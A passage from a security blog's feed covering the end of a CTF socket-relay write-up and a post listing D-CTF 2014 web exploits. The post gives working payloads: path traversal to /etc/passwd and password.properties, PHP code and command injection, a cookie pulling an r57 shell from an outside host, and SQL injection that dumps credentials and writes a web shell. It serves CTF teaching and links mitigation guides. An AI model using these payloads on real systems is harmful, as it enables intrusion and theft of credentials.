    &lt;span class="n"&gt;tw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sec&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;did this:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Magic from w to m: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;tw&lt;/span&gt;

    &lt;span class="c"&gt;# connect to m&lt;/span&gt;
    &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PORTm&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;mrblack&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;tm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sec&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;did this:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Magic from m to w: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;tm&lt;/span&gt;

    &lt;span class="c"&gt;# send w&amp;#39;s magic to m&amp;#39;s&lt;/span&gt;
    &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c"&gt;# send m&amp;#39;s magic to get the token&lt;/span&gt;
    &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tm&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Token is: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;

    &lt;span class="c"&gt;# finally, send token back to m&lt;/span&gt;
    &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;sm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;sw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;peace_pipe&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running it leads us to the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;python 300_peace_pipe.py

Magic from w to m: 2f2f5d280871947836e9b5665986c1b75e732d88ae3d464b65d24ea7e41c33c491060379ac4f3dc4a7231f43d6a11b5bfd3a780d8ac46bd1a4cfd99ac041434cb82c5941f17e68a4f180101ece166a1b4da6ea32d62455bd7472892ed9b67fe2122e0b331048e4a11d98422f04ec3063a3652a0e1a90e13a740905bb3a22c9b5e39d1e0fa97f10bff34d76243b9211afd1131b0f6e33d4d99c8069c462677ce67401214c943fee13252060aa02b8b1525ed0af8c9aa5ad5dee64dbb0c275dd6147754c7dfaf3218caf35d7837925215a04bb315e91441306ef0d29f0da733b7e4ac92b500dc522de11c5f5af58248ed5f762b854f40f0adf4b681a937d17a1c0

Magic from m to w: e9eedf64931d5f77f5d061a0f411f9d385144f33fe1419905fdb24a0537cc205a7f99e083f37f98af8553795f1a71f83b7924620790845c3a48bb71a9b70a0f9e5ab95dda40ec4e229bc6a6cd146779de74b7237e42d01e2538c093407165afc79776bbd9bcdefa1d9af27a39f17610b4b9060c2b0ca5203457061facdc68257433253366937cef469261492ac81c177f42f10beea386ddfa09069a5fa2ae2e39a41eeecebdba622b79231cd5f206d0a70c71aa3eb5f706a16c99173f79f97e7f3408b544df556e3779f6d49441c04d33438b9604392f90bca6c2a8c3181b12ec5d492ef2184b9db69fdd1b6247150e3b55f8ee65d113c5350b4b097abadddc9
Bit more truth is missing

Token is: 5QAWhcwSaQicM8LitDGz6To69sBtsO8ASL27zxql8hW8aziveW0B0epJz2PKIFo/K4A&lt;span class="o"&gt;=&lt;/span&gt;
I knew you are able to see IT. Lets get drunk, I tell you where
flag&lt;span class="o"&gt;{&lt;/span&gt;FreeBoozeForEverone-Party!&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="SSH"></category></entry><entry><title>Exploring D-CTF Quals 2014's Exploits</title><link href="http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html" rel="alternate"></link><updated>2014-10-22T06:30:00-04:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-10-22:exploring-d-ctf-quals-2014s-exploits.html</id><summary type="html">&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Vulnerabilities&lt;/h2&gt;
&lt;h3&gt;Remote File Inclusion and Local File Inclusion Vulnerabilities&lt;/h3&gt;
&lt;p&gt;In &lt;a href="http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion"&gt;Remote File Inclusion&lt;/a&gt; (RFI) an attacker can load exploits to the server. An attacker can use RFI to run exploits in both server and client sides. PHP's &lt;a href="http://php.net/manual/en/function.include.php"&gt;include()&lt;/a&gt; is extremely vulnerable to RFI attacks.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion"&gt;Local File Inclusion&lt;/a&gt; (LFI) is similar to RFI but only files that are currently in the server can be included.  This type of vulnerability is seem in forms for file uploading (with improper sanitation).&lt;/p&gt;
&lt;p&gt;An example of RFI exploitation is the case where the form only accepts some type of extensions (such as JPG or PNG) but the verification is made in the client side. In this case, an attacker can tamper the HTTP requests to send shell code (with PHP extension, for example). I've shown examples of this attack in the  &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas post&lt;/a&gt;. There  I've explained that the trick was to rename a PHP shell code to one of these safe extensions.&lt;/p&gt;
&lt;h3&gt;TimThumb and LFI&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://code.google.com/p/timthumb/"&gt;TimThumb&lt;/a&gt; is a PHP script for manipulating web images. It was recently &lt;a href="http://www.binarymoon.co.uk/2014/09/timthumb-end-life/"&gt;discontinued because of security issues&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;With TimThumb 1.33, an attacker is able to upload a shell by appending it to an image. All  she needs to do is to have it in some online subdomain. TimThumb will store this image in a cache folder and generate a MD5 of the full path of the shell. The last step is to perform a LFI attack with the shell in this folder. Check this &lt;a href="http://kaoticcreations.blogspot.com/2011/12/lfi-tip-how-to-read-source-code-using.html"&gt;example of LFI exploitation&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;CMS Mini and RFI&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.mini-print.com/"&gt;CMS Mini&lt;/a&gt; is file system to build simple websites. It has &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt; such as &lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)"&gt;CSRF&lt;/a&gt;, RFI, and &lt;a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"&gt;XSS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;An example of RFI vulnerability in CMS Mini is explored using curl:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://&lt;/span&gt;
&lt;span class="err"&gt;[target/IP]/cmsmini/admin/edit.php?path=&amp;amp;name=../../../../../etc/passwd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For more examples of exploits, check &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt; and &lt;a href="http://www.exploit-db.com/exploits/28128/"&gt;this exploit-db&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;ApPHP and Remote Code Execution&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.apphp.com/"&gt;ApPHP&lt;/a&gt; is a blog script. It is known for having  &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution"&gt;remote code execution&lt;/a&gt; (RCE). An example of RCE exploit for ApPHP &lt;a href="http://www.exploit-db.com/exploits/33070/"&gt;can be seen here&lt;/a&gt;. A good start is to check the PHP's &lt;a href="http://php.net/manual/en/ini.core.php#ini.disable-functions"&gt;disable_function&lt;/a&gt; list for stuff to hacker the server.&lt;/p&gt;
&lt;p&gt;In this CTF, the challenge was to find what was not in that list. For instance, it was possible to use &lt;a href="http://php.net/manual/en/reserved.variables.post.php"&gt;$_POST&lt;/a&gt; and &lt;a href="http://php.net/manual/en/reserved.variables.cookies.php"&gt;$_COOKIE&lt;/a&gt; to send strings to functions such as &lt;a href="http://php.net/manual/en/function.scandir.php"&gt;scandir()&lt;/a&gt; and &lt;a href="http://php.net/manual/en/function.file-get-contents.php"&gt;get_file_contents()&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/&lt;/span&gt;
&lt;span class="err"&gt;Cookie: 0=include&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In addition, with a writable directory we can drop a shell in the server (you can use script-kiddies scripts like &lt;a href="http://www.r57shell.net/"&gt;r57 shell.net&lt;/a&gt;, but in real life, keep in mind that they are super uber &lt;a href="http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447"&gt;backdoored&lt;/a&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
&lt;span class="err"&gt;Cookie: 0=http://www.r57shell.net/shell/r57.txt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Gitlist and Remote Command Execution&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://gitlist.org/"&gt;Gitlist&lt;/a&gt; is an application to browse github repositories in a browser. The  versions up to 5.0 are known for &lt;a href="http://www.websecuritywatch.com/arbitrary-command-execution-in-gitlist/"&gt;allowing remote attackers to execute arbitrary commands via shell&lt;/a&gt;, a type of &lt;a href="http://cwe.mitre.org/data/definitions/77.html"&gt;command injection&lt;/a&gt;. Exploits for this vulnerability can be seen at &lt;a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/"&gt;hatriot&lt;/a&gt;, at &lt;a href="http://packetstormsecurity.com/files/127364/Gitlist-Unauthenticated-Remote-Command-Execution.html"&gt;packet storm&lt;/a&gt;, at &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt;, and at &lt;a href="http://www.exploit-db.com/exploits/33990/"&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this CTF, the following command could be used to look for the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;LibreOffice's Socket Connections&lt;/h3&gt;
&lt;p&gt;LibreOffice's has a binary &lt;a href="http://www.processlibrary.com/en/directory/files/soffice/66728/"&gt;soffice.bin&lt;/a&gt; that takes socket connections on the &lt;em&gt;port 2002&lt;/em&gt; (in this CTF, in the VPN's localhost).&lt;/p&gt;
&lt;p&gt;For instance, the  command &lt;a href="http://linux.die.net/man/1/unoconv"&gt;unoconv&lt;/a&gt; can be used  to convert a file to a LibreOffice supported format. The flag &lt;strong&gt;-c&lt;/strong&gt; opens a connection by the client to connect to an LibreOffice instance. It also can be used by the listener to make LibreOffice listen.&lt;/p&gt;
&lt;p&gt;From the documentation, the default connection string is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Default connection string is &amp;quot;socket,host=localhost,port=2002;urp;StarOffice.ComponentContext&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Therefore, you can connect to the socket and convert some document (such as &lt;em&gt;/flag.txt&lt;/em&gt;) to a PDF for example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unoconv --connection &lt;span class="s1"&gt;&amp;#39;socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext&amp;#39;&lt;/span&gt; -f pdf /flag.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;An example of payload can be seen &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;ColdFusion and Local File Disclosure&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Adobe_ColdFusion"&gt;ColdFusion&lt;/a&gt; is an old web application development platform. It carries its own (interpreted) language, &lt;strong&gt;CFM&lt;/strong&gt;, with a Java backend.&lt;/p&gt;
&lt;p&gt;CFM has scripting features like ASP and PHP, and syntax resembling HTML and JavaScript.  ColdFusion scripts  have &lt;strong&gt;cfm&lt;/strong&gt; and &lt;strong&gt;cfc&lt;/strong&gt; file extension. For instance,  &lt;a href="http://www.adobe.com/products/coldfusion-family.html"&gt;Adobe ColdFusion 11&lt;/a&gt; and &lt;a href="http://www.getrailo.org/"&gt;Railio 4.2&lt;/a&gt;, the two platform accepting CFM,  were both released in the beginning of 2014.&lt;/p&gt;
&lt;p&gt;The problem is that CFM is &lt;a href="http://www.intelligentexploit.com/view-details.html?id=12750"&gt;vulnerable to a variety of attacks&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/Full_Path_Disclosure"&gt;Local File Disclosure&lt;/a&gt; (LFD) and SQL injection (SQLi). Adding this to the fact that ColdFusion scripts  usually run on elevated privileged users, we have a very vulnerable platform.&lt;/p&gt;
&lt;h4&gt;SQL Injection (SQLi)&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://www.owasp.org/index.php/SQL_Injection"&gt;SQL Injection&lt;/a&gt; is a classic attack where one injects exploits in a &lt;a href="http://technet.microsoft.com/en-us/library/bb264565(v=sql.90).aspx"&gt;SQL query&lt;/a&gt;. Vulnerabilities of this type can be spot in queries such as &lt;strong&gt;index.php?id=1&lt;/strong&gt;. I showed some of these exploits in my &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this CTF, these were  some of the  exploits that could be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;List everything  in a database, where &lt;strong&gt;0x3a&lt;/strong&gt; is the hexadecimal symbol for &lt;strong&gt;:&lt;/strong&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;cms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;See the password file content:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LOAD_FILE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Write files and create a PHP shell into &lt;strong&gt;URL/shell.php&lt;/strong&gt;, we can use a parameter &lt;strong&gt;x&lt;/strong&gt; to takes a parameter to be executed (based on &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;this&lt;/a&gt;):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php header(&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;utf-8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;); echo system($-GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;); ?&amp;gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;--&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notice the &lt;em&gt;trailing pair of hyphens&lt;/em&gt; &lt;strong&gt;--&lt;/strong&gt; which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed (it removes the trailing single-quote left over from the modified query). To learn more about how to mitigate SQLi, I recommend &lt;a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet"&gt;OWASP's SQLi Prevention Cheat Sheet&lt;/a&gt; and &lt;a href="http://owtf.github.io/boilerplate-templates/SQLinjection.html"&gt;this nice guide for SQLi mitigation&lt;/a&gt; by OWSAP OWTF.&lt;/p&gt;
&lt;p&gt;By the way, it's useful in general to know &lt;a href="http://www.w3schools.com/tags/ref_urlencode.asp"&gt;HTML URL Encoding&lt;/a&gt; to craft these URLs.&lt;/p&gt;
&lt;h3&gt;CesarFTP 0.99g and Buffer Overflow&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.softpedia.com/get/Internet/Servers/FTP-Servers/Cesar-FTP.shtml"&gt;CesarFTP 0.99g&lt;/a&gt; is an easy-to-use  FTP server. It is also known for having several vulnerabities, including &lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2961"&gt;buffer overflow&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For example, see this exploit for &lt;strong&gt;Metasploit&lt;/strong&gt; from &lt;a href="http://www.exploit-db.com/exploits/16713/"&gt;exploit-db&lt;/a&gt; (or &lt;a href="http://www.exploit-db.com/exploits/1906/"&gt;an older one here&lt;/a&gt;).&lt;/p&gt;
&lt;h4&gt;File Disclosure of Password Hashes&lt;/h4&gt;
&lt;p&gt;This vulnerability provides a 30 second window in the Administration panel, which can e use to write a shell code. The main idea is a &lt;a href="https://www.owasp.org/index.php/Path_Traversal"&gt;directory traversal&lt;/a&gt; to the &lt;strong&gt;password.proprieties&lt;/strong&gt; that can be used to login in the server.&lt;/p&gt;
&lt;p&gt;Ingredients of this attack are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The target must have ColdFusion administrator available, which is by default mapped to &lt;strong&gt;&lt;em&gt;CFIDE/administrator/enter.cfm&lt;/em&gt;&lt;/strong&gt;. If it gets &lt;a href="http://en.wikipedia.org/wiki/List_of_HTTP_status_codes"&gt;500&lt;/a&gt;, it should be switched to HTTPS.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;At the ColdFusion administrator, verify the version, and then use these injections:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en&lt;/span&gt;

